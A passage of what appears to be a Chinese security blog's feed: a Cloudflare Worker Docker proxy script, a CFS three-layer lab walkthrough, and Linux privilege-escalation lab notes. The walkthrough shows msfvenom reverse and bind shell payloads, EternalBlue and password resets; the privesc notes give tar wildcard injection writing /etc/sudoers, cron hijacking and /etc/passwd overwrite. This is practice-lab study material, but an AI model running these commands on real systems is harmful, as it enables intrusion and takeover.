href=&quot;https://cloudflare.com&quot;&gt;Cloudflare&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">`</span><br><span class="line"></span><br><span class="line">const routes = &#123;</span><br><span class="line">  // 替换为你的域名</span><br><span class="line">  &quot;xx.xx.xx&quot;: dockerHub,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function routeByHosts(host) &#123;</span><br><span class="line">  if (host in routes) &#123;</span><br><span class="line">    return routes[host];</span><br><span class="line">  &#125;</span><br><span class="line">  return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function handleRequest(request) &#123;</span><br><span class="line"></span><br><span class="line">  const url = new URL(request.url);</span><br><span class="line"></span><br><span class="line">  if (url.pathname == &quot;/&quot;) &#123;</span><br><span class="line">    return handleHomeRequest(url.host);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const upstream = routeByHosts(url.hostname);</span><br><span class="line">  if (!upstream) &#123;</span><br><span class="line">    return createNotFoundResponse(routes);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const isDockerHub = upstream == dockerHub;</span><br><span class="line">  const authorization = request.headers.get(&quot;Authorization&quot;);</span><br><span class="line">  if (url.pathname == &quot;/v2/&quot;) &#123;</span><br><span class="line">    return handleFirstRequest(upstream, authorization, url.hostname);</span><br><span class="line">  &#125;</span><br><span class="line">  // get token</span><br><span class="line">  if (url.pathname == &quot;/v2/auth&quot;) &#123;</span><br><span class="line">    return handleAuthRequest(upstream, url, isDockerHub, authorization);</span><br><span class="line">  &#125;</span><br><span class="line">  // redirect for DockerHub library images</span><br><span class="line">  // Example: /v2/busybox/manifests/latest =&gt; /v2/library/busybox/manifests/latest</span><br><span class="line">  if (isDockerHub) &#123;</span><br><span class="line">    const pathParts = url.pathname.split(&quot;/&quot;);</span><br><span class="line">    if (pathParts.length == 5) &#123;</span><br><span class="line">      pathParts.splice(2, 0, &quot;library&quot;);</span><br><span class="line">      const redirectUrl = new URL(url);</span><br><span class="line">      redirectUrl.pathname = pathParts.join(&quot;/&quot;);</span><br><span class="line">      return Response.redirect(redirectUrl.toString(), 301);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return handlePullRequest(upstream, request);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function parseAuthenticate(authenticateStr) &#123;</span><br><span class="line">  // sample: Bearer realm=&quot;https://auth.ipv6.docker.com/token&quot;,service=&quot;registry.docker.io&quot;</span><br><span class="line">  // match strings after =&quot; and before &quot;</span><br><span class="line">  const re = /(?&lt;=\=&quot;)(?:\\.|[^&quot;\\])*(?=&quot;)/g;</span><br><span class="line">  const matches = authenticateStr.match(re);</span><br><span class="line">  if (matches == null || matches.length &lt; 2) &#123;</span><br><span class="line">    throw new Error(`invalid Www-Authenticate Header: $&#123;authenticateStr&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line">  return &#123;</span><br><span class="line">    realm: matches[0],</span><br><span class="line">    service: matches[1],</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function fetchToken(wwwAuthenticate, scope, authorization) &#123;</span><br><span class="line">  const url = new URL(wwwAuthenticate.realm);</span><br><span class="line">  if (wwwAuthenticate.service.length) &#123;</span><br><span class="line">    url.searchParams.set(&quot;service&quot;, wwwAuthenticate.service);</span><br><span class="line">  &#125;</span><br><span class="line">  if (scope) &#123;</span><br><span class="line">    url.searchParams.set(&quot;scope&quot;, scope);</span><br><span class="line">  &#125;</span><br><span class="line">  const headers = new Headers();</span><br><span class="line">  if (authorization) &#123;</span><br><span class="line">    headers.set(&quot;Authorization&quot;, authorization);</span><br><span class="line">  &#125;</span><br><span class="line">  return await fetch(url, &#123; method: &quot;GET&quot;, headers: headers &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function handleHomeRequest(host) &#123;</span><br><span class="line">  return new Response(HTML.replace(/&#123;:host&#125;/g, host), &#123;</span><br><span class="line">    status: 200,</span><br><span class="line">    headers: &#123;</span><br><span class="line">      &quot;content-type&quot;: &quot;text/html&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function handlePullRequest(upstream, request) &#123;</span><br><span class="line">  const url = new URL(request.url);</span><br><span class="line">  const newUrl = new URL(upstream + url.pathname);</span><br><span class="line">  const newReq = new Request(newUrl, &#123;</span><br><span class="line">    method: request.method,</span><br><span class="line">    headers: request.headers,</span><br><span class="line">    redirect: &quot;follow&quot;,</span><br><span class="line">  &#125;);</span><br><span class="line">  return await fetch(newReq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function handleFirstRequest(upstream, authorization, hostname) &#123;</span><br><span class="line">  const newUrl = new URL(upstream + &quot;/v2/&quot;);</span><br><span class="line">  const headers = new Headers();</span><br><span class="line">  if (authorization) &#123;</span><br><span class="line">    headers.set(&quot;Authorization&quot;, authorization);</span><br><span class="line">  &#125;</span><br><span class="line">  // check if need to authenticate</span><br><span class="line">  const resp = await fetch(newUrl.toString(), &#123;</span><br><span class="line">    method: &quot;GET&quot;,</span><br><span class="line">    headers: headers,</span><br><span class="line">    redirect: &quot;follow&quot;,</span><br><span class="line">  &#125;);</span><br><span class="line">  if (resp.status === 401) &#123;</span><br><span class="line">      headers.set(</span><br><span class="line">        &quot;Www-Authenticate&quot;,</span><br><span class="line">        `Bearer realm=&quot;https://$&#123;hostname&#125;/v2/auth&quot;,service=&quot;cloudflare-docker-proxy&quot;`</span><br><span class="line">      );</span><br><span class="line">    return new Response(JSON.stringify(&#123; message: &quot;Unauthorized&quot; &#125;), &#123;</span><br><span class="line">      status: 401,</span><br><span class="line">      headers: headers,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return resp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function handleAuthRequest(upstream, url, isDockerHub, authorization) &#123;</span><br><span class="line">  const newUrl = new URL(upstream + &quot;/v2/&quot;);</span><br><span class="line">  const resp = await fetch(newUrl.toString(), &#123;</span><br><span class="line">    method: &quot;GET&quot;,</span><br><span class="line">    redirect: &quot;follow&quot;,</span><br><span class="line">  &#125;);</span><br><span class="line">  if (resp.status !== 401) &#123;</span><br><span class="line">    return resp;</span><br><span class="line">  &#125;</span><br><span class="line">  const authenticateStr = resp.headers.get(&quot;WWW-Authenticate&quot;);</span><br><span class="line">  if (authenticateStr === null) &#123;</span><br><span class="line">    return resp;</span><br><span class="line">  &#125;</span><br><span class="line">  const wwwAuthenticate = parseAuthenticate(authenticateStr);</span><br><span class="line">  let scope = url.searchParams.get(&quot;scope&quot;);</span><br><span class="line">  // autocomplete repo part into scope for DockerHub library images</span><br><span class="line">  // Example: repository:busybox:pull =&gt; repository:library/busybox:pull</span><br><span class="line">  if (scope &amp;&amp; isDockerHub) &#123;</span><br><span class="line">    let scopeParts = scope.split(&quot;:&quot;);</span><br><span class="line">    if (scopeParts.length == 3 &amp;&amp; !scopeParts[1].includes(&quot;/&quot;)) &#123;</span><br><span class="line">      scopeParts[1] = &quot;library/&quot; + scopeParts[1];</span><br><span class="line">      scope = scopeParts.join(&quot;:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return await fetchToken(wwwAuthenticate, scope, authorization);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const createNotFoundResponse = (routes) =&gt; new Response(</span><br><span class="line">  JSON.stringify(&#123; routes &#125;),</span><br><span class="line">  &#123;</span><br><span class="line">    status: 404,</span><br><span class="line">    headers: &#123;</span><br><span class="line">      &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>然后添加你的自定义域名</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240726181311444.png" alt="image-20240726181311444"></p><p>修改你的配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240726181349582.png" alt="image-20240726181349582"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br><span class="line">root@iZwz96csuvmrvwxme3o9e2Z:~/tools/Supershell# docker-compose up -d   #别忘记先配置你的Supershell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240726181509256.png" alt="image-20240726181509256"></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>后续安装其他应用的话也会在这篇笔记更新</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CFS三层靶机练习记录</title>
      <link href="/2024/07/22/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/22/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CFS三层靶机练习记录"><a href="#CFS三层靶机练习记录" class="headerlink" title="CFS三层靶机练习记录"></a>CFS三层靶机练习记录</h1><p><strong>题目信息</strong></p><p>云尘靶场 CFS三层靶机，去年打了一次没打完，这次打完看看</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722152837641.png" alt="image-20240722152837641"></p><p><strong>题解</strong></p><h2 id="172-25-0-13"><a href="#172-25-0-13" class="headerlink" title="172.25.0.13"></a>172.25.0.13</h2><p>fscan主机扫描172.25.0.1&#x2F;24</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722153008712.png" alt="image-20240722153008712"></p><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>thinkphp一把梭，进来拿到第一个flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722153445653.png" alt="image-20240722153445653"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>根目录还有一个flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722153545655.png" alt="image-20240722153545655"></p><p>多网卡</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722175519612.png" alt="image-20240722175519612"></p><p>192.168.22.0.&#x2F;24 c段fscan扫描</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722175555515.png" alt="image-20240722175555515"></p><h2 id="192-168-22-22"><a href="#192-168-22-22" class="headerlink" title="192.168.22.22"></a>192.168.22.22</h2><p>bagecms 主页源码有hint</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722175617591.png" alt="image-20240722175617591"></p><p>流量代理出来sqlmap注入，down库</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>flag和后台密码123qwe</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722180508576.png" alt="image-20240722180508576"></p><p>后台也能看见这个flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722180611463.png" alt="image-20240722180611463"></p><p>模板管理，写shell</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722182451893.png" alt="image-20240722182451893"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>网站根目录flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722182557577.png" alt="image-20240722182557577"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>服务器根目录flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722182725563.png" alt="image-20240722182725563"></p><p>双网卡，扫描33段</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722182749472.png" alt="image-20240722182749472"></p><p>这里fscan没传上去，直接wget下载上个服务器的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722183324156.png" alt="image-20240722183324156"></p><h2 id="192-168-33-33"><a href="#192-168-33-33" class="headerlink" title="192.168.33.33"></a>192.168.33.33</h2><p>最后一台是个win7，开了445端口</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722183539287.png" alt="image-20240722183539287"></p><p>只能打永恒之蓝，用linux攻击机，我又回kali生成了两个马，回去弹shell，最后一个flag在administrator用户的桌面上</p><p>第一次shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.8.0.166 lport=4444 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722215234878.png" alt="image-20240722215234878"></p><p>路由</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722215303155.png" alt="image-20240722215303155"></p><p>background退出保存shell开始第二次shell和路由</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=3333 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722215442855.png" alt="image-20240722215442855"></p><p>background退出保存shell开始永恒之蓝和后渗透添加用户（改密码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user administrator 123456</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722215623012.png" alt="image-20240722215623012"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">端口转发</span><br><span class="line">meterpreter &gt; portfwd add -l 5555 -p 3389 -r 192.168.33.33</span><br><span class="line">[*] Forward TCP relay created: (local) :5555 -&gt; (remote) 192.168.33.33:3389</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop</span><br></pre></td></tr></table></figure><h3 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h3><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722214847206.png" alt="image-20240722214847206"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>去年其实打过了，但是全程都是用kali打的，而且当时不是很熟悉，当时网络很卡，卡在sqlmap注入bagecms，后面就没打了</p><p>这次其实总体来说还是不错的，打了半天，因为基本都忘记了流程。前两台主机都是用windows本机打下来的，用Neo-reGeorg做代理转发流量，但是永恒之蓝这里我不想用kali，所以卡住了挺久，最后还是选择上msf，传shell，加路由来打第三台的永恒之蓝。</p><p>算是熟悉巩固了一下吧。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权靶场练习记录</title>
      <link href="/2024/07/22/%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/07/22/%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="提权靶场练习记录"><a href="#提权靶场练习记录" class="headerlink" title="提权靶场练习记录"></a>提权靶场练习记录</h1><p><a href="http://www.cloud-pentest.cn/index.html#;">云尘靶场</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722123906804.png" alt="image-20240722123906804"></p><h2 id="Linux提权练习"><a href="#Linux提权练习" class="headerlink" title="Linux提权练习"></a>Linux提权练习</h2><p><strong>题目说明</strong></p><p>简介： 这是一个Linux suid提权的容器环境。访问方式为SSH连接，账号和密码均为admin。 包含多个sudo、suid提权程序,比较简单，仅供练习。 </p><p> 教程参考：<a href="http://t.csdnimg.cn/xffqO">http://t.csdnimg.cn/xffqO</a></p><p><strong>参考资料</strong></p><p><a href="https://xz.aliyun.com/t/12535?time__1311=GqGxuCitqWq052x+xCqiKo0KL207OWoT4D">浅谈linux suid提权</a></p><p><strong>什么是suid</strong></p><p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p><p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p><p><strong>如何设置suid</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s filename #设置suid</span><br><span class="line">chmod u-s filename #去除suid</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/20230519193022-8a7c981a-f638-1.png" alt="20230519193022-8a7c981a-f638-1"></p><p><strong>如何查找suid文件</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line">-perm 表示搜索随后的权限</span><br><span class="line">-u = s表示查找root用户拥有的文件</span><br><span class="line">-type表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt;表示重定向</span><br><span class="line">/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure><p><strong>具有suid权限的二进制可执行文件</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure><p>所以，如果我们能找到以上这些文件，且有suid权限，就可以进行提权</p><p><strong>题解</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722130057763.png" alt="image-20240722130057763"></p><p>以find为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find 任意文件 -exec whoami \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722130240386.png" alt="image-20240722130240386"></p><h2 id="Linux提权系列-1"><a href="#Linux提权系列-1" class="headerlink" title="Linux提权系列-1"></a>Linux提权系列-1</h2><p><strong>题目说明</strong></p><p>ssh进行访问，用户名ctf, 密码supermotdepasse</p><p><strong>参考资料</strong></p><p><a href="https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/di-er-zhang-linux-gong-fang-kuai-su-ru-men-shang/sudo-shou-quan-yu-ti-quan">SUDO授权与提权</a></p><p><strong>题解</strong></p><p>这题没有可提权的suid程序，从其他方面入手</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p>发现有另外一个用户user1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u user1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722135501370.png" alt="image-20240722135501370"></p><h2 id="Linux提权系列-2"><a href="#Linux提权系列-2" class="headerlink" title="Linux提权系列-2"></a>Linux提权系列-2</h2><p><strong>题目说明</strong></p><p>ssh进行访问，用户名ctf,密码supermotdepasse</p><p><strong>题解</strong></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722140641471.png" alt="image-20240722140641471"></p><h2 id="Linux提权系列-3"><a href="#Linux提权系列-3" class="headerlink" title="Linux提权系列-3"></a>Linux提权系列-3</h2><p><strong>题目说明</strong></p><p>ssh进行访问，用户名ctf,密码supermotdepasse</p><p><strong>参考资料</strong></p><p><a href="https://xz.aliyun.com/t/2401?time__1311=n4+xni0=G=oDqAI5GNyWxmhj0DCF3oDun1oD">利用定时任务（Cronjobs）进行Linux提权</a></p><p><strong>题解</strong></p><p>这题同样有个user3</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722141141428.png" alt="image-20240722141141428"></p><p>没有可提权的suid程序</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722141208945.png" alt="image-20240722141208945"></p><p>但是发现了有user3的定时任务</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722141239210.png" alt="image-20240722141239210"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /usr/bin/find&quot; &gt; test.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line"></span><br><span class="line">echo &#x27;echo &quot;ctf ALL=(user3) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#x27; &gt; demo.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh demo.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure><p>这里不知道为什么不成功</p><h2 id="Linux提权系列-4"><a href="#Linux提权系列-4" class="headerlink" title="Linux提权系列-4"></a>Linux提权系列-4</h2><p><strong>题目说明</strong></p><p>ssh进行访问，用户名ctf,密码supermotdepasse</p><p><strong>题解</strong></p><p>我以为是先换到user1用户，然后cp提权</p><p>但是这题直接echo就行？？</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240722152126886.png" alt="image-20240722152126886"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p><strong>原理</strong></p><p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p><p><strong>利用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure><h3 id="crontab提权"><a href="#crontab提权" class="headerlink" title="crontab提权"></a>crontab提权</h3><p><strong>原理</strong></p><p>利用其他用户创建的定时任务，通过修改任务要执行的程序代码或利用任务执行的一些过程来提权</p><p><strong>利用</strong></p><h4 id="crontab文件覆写"><a href="#crontab文件覆写" class="headerlink" title="crontab文件覆写"></a>crontab文件覆写</h4><p>如果任务执行的程序或脚本，当前用户有修改权限等，则可以修改其内容来提权，以下是一个例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#存在root用户执行cleanup.py脚本</span><br><span class="line">cat /etc/crontab</span><br><span class="line">*/2 *   * * *   root /usr/bin/python3 /tmp/cleanup.py</span><br><span class="line"></span><br><span class="line">#原内容</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">   os.system(&#x27;rm -r /home/cleanup/* &#x27;)</span><br><span class="line">except:</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">#修改后内容</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">   os.system(&#x27;chmod u+s /bin/bash&#x27;)</span><br><span class="line">except:</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">等待定时任务执行后，利用/bin/bash提权</span><br></pre></td></tr></table></figure><h4 id="Crontab-Tar-Wildcard注入"><a href="#Crontab-Tar-Wildcard注入" class="headerlink" title="Crontab Tar Wildcard注入"></a>Crontab Tar Wildcard注入</h4><p><strong>原理</strong></p><p>当定时任务是执行备份利用了tar -zcf等命令时，则可以进行提权操作</p><p><strong>利用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看定时任务</span><br><span class="line">cat /etc/crontab</span><br><span class="line">*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*</span><br></pre></td></tr></table></figure><p>在&#x2F;var&#x2F;www&#x2F;html目录下执行，则定时任务执行时，用户ignite会被授予sudo的root权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#x27; &gt;test.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure><h3 id="sudo及su的含义"><a href="#sudo及su的含义" class="headerlink" title="sudo及su的含义"></a>sudo及su的含义</h3><p><a href="https://blog.csdn.net/shengjie87/article/details/106907178">参考链接</a></p><p>sudo和su是linux系统对普通用户权限管理的两种方式</p><h4 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h4><p>临时提权，仅针对某些命令或程序</p><p>sudo的配置文件是 &#x2F;etc&#x2F;sudoers ，我们可以用他的专用工具visudo编辑，此工具的好处是在添加规则不太准确时，保存退出时会提示给我们错误信息，配置好后，可以通过sudo -l 来查看哪些命令是可以执行或禁止的</p><h4 id="su"><a href="#su" class="headerlink" title="su"></a>su</h4><p>永久提权，即切换到其他权限足够的用户</p><h3 id="覆盖-etc-passwd提权"><a href="#覆盖-etc-passwd提权" class="headerlink" title="覆盖&#x2F;etc&#x2F;passwd提权"></a>覆盖&#x2F;etc&#x2F;passwd提权</h3><p><a href="https://www.cnblogs.com/jerrylocker/p/10930649.html">参考链接</a></p><p><strong>利用条件</strong></p><ol><li>拥有一个普通用户的权限</li><li>普通用户有&#x2F;etc&#x2F;passwd的写权限</li></ol><p><strong>利用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#OpenSSL</span><br><span class="line">openssl passwd -1 -salt salt password</span><br><span class="line"></span><br><span class="line">#mkpasswd</span><br><span class="line">mkpasswd -m SHA-512 password</span><br><span class="line"></span><br><span class="line">#Python</span><br><span class="line">python -c &#x27;import crypt; print crypt.crypt(&quot;password&quot;,&quot;$6$salt&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">#Perl</span><br><span class="line">perl -le &#x27;print crypt(&quot;password&quot;,&quot;salt&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">#PHP</span><br><span class="line">php -r &quot;print(crypt(&#x27;password&#x27;,&#x27;salt&#x27;) . \&quot;\n\&quot;);&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test:passwd_hash:0:0::/bin/hash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Sec Code练习（未写完）</title>
      <link href="/2024/07/17/Java%20Sec%20Code%E7%BB%83%E4%B9%A0%EF%BC%88%E6%9C%AA%E5%86%99%E5%AE%8C%EF%BC%89/"/>
      <url>/2024/07/17/Java%20Sec%20Code%E7%BB%83%E4%B9%A0%EF%BC%88%E6%9C%AA%E5%86%99%E5%AE%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Sec-Code练习（未写完）"><a href="#Java-Sec-Code练习（未写完）" class="headerlink" title="Java Sec Code练习（未写完）"></a>Java Sec Code练习（未写完）</h1><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p><strong>部署</strong></p><p>IDEA部署</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox">oracle官网下载jdk 8u102</a></p><p>设置SDK1.8</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720232347051.png" alt="image-20240720232347051"></p><p>Maven同步依赖和插件，我的Maven版本是3.9.6，注意修改setting.xml，阿里云镜像加速，不然会很慢，这一步我花了1个小时-.-</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720232620361.png" alt="image-20240720232620361"></p><p>修改application.properties，spring.datasource.password为自己本地数据库密码，同时创建数据库java_sec_code，导入create_db.sql，暂时使用MySQL5.7，如果后续出问题再换8.0.12</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720232708664.png" alt="image-20240720232708664"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240720233026245.png" 